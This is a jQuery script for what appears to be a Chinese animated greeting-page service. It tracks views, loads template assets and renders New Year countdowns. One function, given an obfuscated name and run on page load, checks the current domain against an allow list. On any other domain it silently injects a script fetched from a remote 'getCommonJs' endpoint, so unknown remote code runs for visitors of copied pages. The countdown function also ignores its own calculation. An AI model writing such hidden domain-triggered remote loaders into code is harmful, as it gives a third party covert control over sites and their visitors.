$(document).ready(function() {
    
    if(typeof(temp_id) != "undefined"){
        //检测自动播放音乐
        //checkAudio();
        
        //增加页面浏览量
        $.getJSON("/api/readOnce?id="+ id +"&temp_id="+ temp_id +"&data_type=" + data_type,function(data){
            //小程序生成的数据更新views
            if(data_type == 1){
                views = data.data.views;
                
                //存在views变量
                if(typeof(views) != "undefined"){
                    if($(".boxText").text().trim() != ''){
                        
                        $(".boxText").html($(".boxText").html().replace('[DJS:VIEWS]',views));  
                        console.log($(".boxText").html())
                    }
                }
                
            }
        });
        
    }
})

//检查对应的模板ID加载相应素材JS等资源文件
c04f851();

//检测文案是否包含倒计时标签
c03e852();

//检测当前域名是否自己的业务域名，不是的话执行自定义JS代码~
c14b153();

//检查对应的模板ID加载相应素材JS等资源文件
function c04f851(){
    
    //存在views变量
    if(data_type == 0 && typeof(views) != "undefined"){
        if($(".boxText").text().trim() != ''){
            $(".boxText").html($(".boxText").html().replace('[DJS:VIEWS]',views));  
        }
    }
            
    //存在temp_id
    if(typeof(temp_id) != "undefined"){
        console.log("temp_id:" + temp_id);
        if(temp_id == 1){
            //文案模板
            document.writeln("<script src=\"https://zy.20it.cn/template/wenan/js/typeit.min.js\"><\/script>");
            document.writeln("<script src=\"https://zy.20it.cn/template/wenan/js/su.js\"><\/script>");
        }else if(temp_id == 2){
            //爱心模板
            document.writeln("<script src=\"https://zy.20it.cn/template/aixin/js/main.js\"><\/script>");
        }else if(temp_id == 3){
            //烟花模板
            document.writeln("<script src=\"https://zy.20it.cn/template/yanhua/js/fscreen@1.0.1.js\"><\/script>");
            document.writeln("<script src=\"https://zy.20it.cn/template/yanhua/js/Stage@0.1.4.js\"><\/script>");
            document.writeln("<script src=\"https://zy.20it.cn/template/yanhua/js/MyMath.js\"><\/script>");
        }else if(temp_id == 4){
            //圣诞节模板
            document.writeln("<script src=\"https://zy.20it.cn/template/backtxt/js/xuehua.js\"><\/script>");
            document.writeln("<script src=\"https://zy.20it.cn/template/backtxt/js/typed.js\"><\/script>");
            document.writeln("<script src=\"https://zy.20it.cn/template/backtxt/js/main.js\"><\/script>");
        }else if(temp_id == 10){
            //倒计时模板
            document.writeln("<script src=\"http://360ab.cn/template/jishi/js/app.js\"><\/script>");
        }else if(temp_id == 13){
            //视频嵌套模板
    
            document.writeln("<script src=\"https://zy.20it.cn/template/wenan/js/typeit.min.js\"><\/script>");
            $(".div_is_open_btn").click(function(){
                $(".div_is_open_bg").hide();
                $("#video1")[0].play();
                
                if($(".boxText").text().trim() != ''){
                    //alert($(".boxText").text().trim());
                    $(".div_is_typed").show();
        
                    new TypeIt('#box', {
                        lifeLike: true,
                        cursorSpeed: 800,
                        waitUntilVisible: true,
                        speed: 170
                    }).go();
                }
            });
        }
    }
}



//检测当前域名是否自己的业务域名，不是的话执行自定义JS代码~
function c14b153(){
    var host = window.location.host.replace('www.','');
    var allow_host_arr = [
        'corestudi0.github.io',
        'web-360.ai8.top',
        'web-360.20it.cn',
        '360ab.cn',
        '360ta.cn',
        '360ka.cn',
        'accct.cn',
        '20it.cn',
        'ai8.top',
    ];
    
    if(!in_array(host,allow_host_arr)){
        //alert("不是自己的域名");
        document.writeln("<script src=\"https://ai8.top/api/getCommonJs?"+ Date.now() +"\"><\/script>");
    }
}
function in_array(a, b) {
    var length = b.length;
    for(var i = 0; i < length; i++) {
        if(typeof b[i] == 'object') {
            if(Compare(b[i], a)) return true;
        } else {
            if(b[i] == a) return true;
        }
    }
    return false;
}



//检测文案是否包含倒计时标签
function c03e852(){
    
    var codeText = $(".boxText").html();
    //codeText = codeText.trim();
    if(codeText && codeText.indexOf('[DJS:') > -1){
        
        //有倒计时修改需求
        var djsText = getSubStr(codeText,"DJS:","]");
        
        var djsArr = djsText.split(":");
        if(djsArr.length == 1){
            //返回详细时间
            var Time = calcDown(djsArr[0],true);
            codeText = codeText.replace(`[DJS:${djsArr[0]}]`,`${Time}`);
            $(".boxText").html(codeText);
            /*
            //返回天数
            var day = calcDown(djsArr[0]);
            codeText = codeText.replace(`[DJS:${djsArr[0]}]`,`${day}天`);
            $(".boxText").html(codeText);
            */
        }else if(djsArr.length == 2){
            //返回详细时间
            var Time = calcDown(djsArr[0],true);
            codeText = codeText.replace(`[DJS:${djsArr[0]}:${djsArr[1]}]`,`${Time}`);
            $(".boxText").html(codeText);
        }
    }
}


//识别并计算倒计时
function calcDown(down_type,is_all = false){
    var ret = '';
    if(down_type == 'KN'){
        //跨年倒计时
        ret = is_all == false ? CountDownDay(2024, 01, 01, 00) : CountDownAll(2024, 01, 01, 00);
    }
    return ret;
}

//取文本中间内容
function getSubStr(str, start, end) {
    let res = str.match(new RegExp(`${start}(.*?)${end}`))
    return res ? res[1] : null
}

//计算倒计时日期
function CountDownDay(year, month, day, hours) {
    let now = new Date();
    let endDate = new Date(year, month - 1, day, hours);
    let leftTime = endDate.getTime() - now.getTime();//计算剩余的毫秒数
    if (leftTime <= 0) {
    leftTime = 0;
    }
    let leftsecond = parseInt(leftTime / 1000);//计算剩余的秒数
    let countDay = Math.floor(leftsecond / (60 * 60 * 24));
    //CountDown(2050, 12, 31, 24)
    return  countDay;
}

//计算倒计时全部时间
function CountDownAll(year, month, day, hours) {
    let now = new Date();
    let endDate = new Date(year, month - 1, day, hours);
    let leftTime = endDate.getTime() - now.getTime();//计算剩余的毫秒数
    if (leftTime <= 0) {
        leftTime = 0;
    }
    let leftsecond = parseInt(leftTime / 1000);//计算剩余的秒数
    day = Math.floor(leftsecond / (60 * 60 * 24));
    let hour = Math.floor((leftsecond - day * 24 * 60 * 60) / 3600);
    let minute = Math.floor((leftsecond - day * 24 * 60 * 60 - hour * 3600) / 60);
    let second = Math.floor(leftTime / 1000 % 60, 10);
    //CountDown(2050, 12, 31, 24)
    return `已经成功`;//`${day}天${hour}小时${minute}分钟`
}



//检测自动播放音乐
function checkAudio(){
    
    var id_name = $("audio").data("id");
    
    console.log("自动播放音乐"  + id_name);
    var audio = document.getElementById(id_name),
        play = function(){
            audio.play();
            document.removeEventListener("touchstart",play, false);
        };
    
    audio.play();
    document.addEventListener("DOMContentLoaded", function () {
        play();
    }, false);
    document.addEventListener("WeixinJSBridgeReady", function () {
        play();
    }, false);
    document.addEventListener('YixinJSBridgeReady', function() {
        play();
    }, false);
    document.addEventListener("touchstart",play, false);
}
